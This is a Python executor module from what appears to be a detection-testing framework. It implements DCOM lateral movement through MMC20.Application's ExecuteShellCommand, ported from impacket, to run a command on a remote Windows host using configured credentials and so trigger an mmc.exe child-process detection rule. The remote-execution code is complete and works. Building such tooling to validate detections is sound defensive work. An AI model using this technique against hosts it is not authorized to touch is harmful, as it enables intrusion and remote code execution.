# rules/engine/executors/dcomexec.py
"""DIRECT_DCOM: DCOM lateral movement via the MMC20.Application COM object.

Ports impacket's dcomexec MMC20 path (Matt Nelson / @enigma0x3). Runs inside a
macvlan netns so the DCOM traffic originates from a unique, non-loopback source IP
with source ports >= 49152 (the netns pins ip_local_port_range). The target's
mmc.exe receives the incoming DCOM connection and spawns the child command, which
is the behaviour the target DCOM sequence rule keys on:
  seq: [network to mmc.exe, incoming, src/dst port >= 49152] -> [process, parent mmc.exe]

params.command is the child command line (run as `cmd.exe /c <command>`); keep it
benign. Defaults to a marker write. object defaults to MMC20 (the only object that
spawns a child; ShellWindows/ShellBrowserWindow use ShellExecute the same way but
MMC20 is what the rule's parent.name:mmc.exe expects).
"""
import base64
from executors.registry import register
from executors._net import now_iso
from result import make_result
from config import subst

_CLSID = {
    "MMC20": "49B2791A-B1AE-4C90-9B8E-E860BA07F889",
}


@register("dcomexec")
def dcomexec(usecase, ctx):
    session = ctx.winrm_factory() if ctx.winrm_factory else None
    source_ip = ctx.dedup.allocate(usecase["id"]) if ctx.dedup else None
    fw = (ctx.firewall.open(session, "dcomexec", ctx.cfg, remoteip=source_ip)
          if (ctx.firewall and session) else [])
    cfg = ctx.cfg
    p = usecase.get("params") or {}
    child_cmd = subst(p.get("command") or "echo zyb_dcom", cfg or {}).strip()
    clsid = _CLSID.get(p.get("object", "MMC20"), _CLSID["MMC20"])
    # b64 everything that comes from config/params so credentials or commands with
    # quotes/backslashes can never break the embedded script's string literals.
    b64cmd = base64.b64encode(child_cmd.encode()).decode()
    b64host = base64.b64encode(str(cfg["win_host"]).encode()).decode()
    b64user = base64.b64encode(str(cfg["win_user"]).encode()).decode()
    b64pass = base64.b64encode(str(cfg["win_pass"]).encode()).decode()
    start = now_iso()
    try:
        code = f'''
import base64
from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, \\
    DISPPARAMS, DISPATCH_PROPERTYGET, VARIANT, VARENUM, DISPATCH_METHOD
from impacket.dcerpc.v5.dcomrt import DCOMConnection, OBJREF, FLAGS_OBJREF_CUSTOM, \\
    OBJREF_CUSTOM, OBJREF_HANDLER, OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, \\
    FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, IRemUnknown2, INTERFACE
from impacket.dcerpc.v5.dtypes import NULL

host = base64.b64decode("{b64host}").decode()
user = base64.b64decode("{b64user}").decode()
passwd = base64.b64decode("{b64pass}").decode()
params = "/c " + base64.b64decode("{b64cmd}").decode()

def getInterface(interface, resp):
    objRefType = OBJREF(b"".join(resp))["flags"]
    if objRefType == FLAGS_OBJREF_CUSTOM: objRef = OBJREF_CUSTOM(b"".join(resp))
    elif objRefType == FLAGS_OBJREF_HANDLER: objRef = OBJREF_HANDLER(b"".join(resp))
    elif objRefType == FLAGS_OBJREF_STANDARD: objRef = OBJREF_STANDARD(b"".join(resp))
    elif objRefType == FLAGS_OBJREF_EXTENDED: objRef = OBJREF_EXTENDED(b"".join(resp))
    else: raise Exception("Unknown OBJREF 0x%x" % objRefType)
    return IRemUnknown2(INTERFACE(interface.get_cinstance(), None,
        interface.get_ipidRemUnknown(), objRef["std"]["ipid"],
        oxid=objRef["std"]["oxid"], oid=objRef["std"]["oxid"], target=interface.get_target()))

def bstr(v):
    a = VARIANT(None, False); a["clSize"] = 5; a["vt"] = VARENUM.VT_BSTR
    a["_varUnion"]["tag"] = VARENUM.VT_BSTR; a["_varUnion"]["bstrVal"]["asData"] = v
    return a

print("DCOM connect [src={source_ip}] -> %s" % host)
dcom = DCOMConnection(host, user, passwd, "", "", "", "", oxidResolver=True)
try:
    empty = DISPPARAMS(None, False)
    empty["rgvarg"] = NULL; empty["rgdispidNamedArgs"] = NULL
    empty["cArgs"] = 0; empty["cNamedArgs"] = 0

    iInterface = dcom.CoCreateInstanceEx(string_to_bin("{clsid}"), IID_IDispatch)
    iMMC = IDispatch(iInterface)
    resp = iMMC.GetIDsOfNames(("Document",))
    resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, empty, 0, [], [])
    pQuit = iMMC.GetIDsOfNames(("Quit",))[0]
    iDocument = IDispatch(getInterface(iMMC, resp["pVarResult"]["_varUnion"]["pdispVal"]["abData"]))
    resp = iDocument.GetIDsOfNames(("ActiveView",))
    resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, empty, 0, [], [])
    iActiveView = IDispatch(getInterface(iMMC, resp["pVarResult"]["_varUnion"]["pdispVal"]["abData"]))
    pExec = iActiveView.GetIDsOfNames(("ExecuteShellCommand",))[0]

    dp = DISPPARAMS(None, False); dp["rgdispidNamedArgs"] = NULL
    dp["cArgs"] = 4; dp["cNamedArgs"] = 0
    arg0 = bstr("cmd.exe"); arg1 = bstr("C:\\\\"); arg2 = bstr(params); arg3 = bstr("7")
    dp["rgvarg"].append(arg3); dp["rgvarg"].append(arg2)
    dp["rgvarg"].append(arg1); dp["rgvarg"].append(arg0)
    iActiveView.Invoke(pExec, 0x409, DISPATCH_METHOD, dp, 0, [], [])
    print("SUCCESS: mmc.exe spawned child via ExecuteShellCommand")
    try:
        iMMC.Invoke(pQuit, 0x409, DISPATCH_METHOD, empty, 0, [], [])
    except Exception:
        pass
    dcom.disconnect()
except Exception as e:
    try: dcom.disconnect()
    except Exception: pass
    print("DCOM_FAIL: %s" % str(e)[:220])
'''
        rc, stdout, stderr = ctx.dedup.run_in_netns(source_ip, code, timeout=90)
        end = now_iso()
        output = stdout + ("\n" + stderr if stderr else "")
        if "SUCCESS" in stdout:
            return make_result(usecase, "SUCCESS", True, attack_start=start, attack_end=end,
                               op_id="direct-dcom-mmc20", output=f"{stdout} [src={source_ip}]")
        return make_result(usecase, f"DCOM_FAIL: {output[:200]}", False,
                           attack_start=start, attack_end=end, output=output)
    except Exception as e:
        return make_result(usecase, f"DCOM_FAIL: {e}", False, attack_start=start, attack_end=now_iso())
    finally:
        if fw and ctx.firewall and session:
            ctx.firewall.close(session, fw)
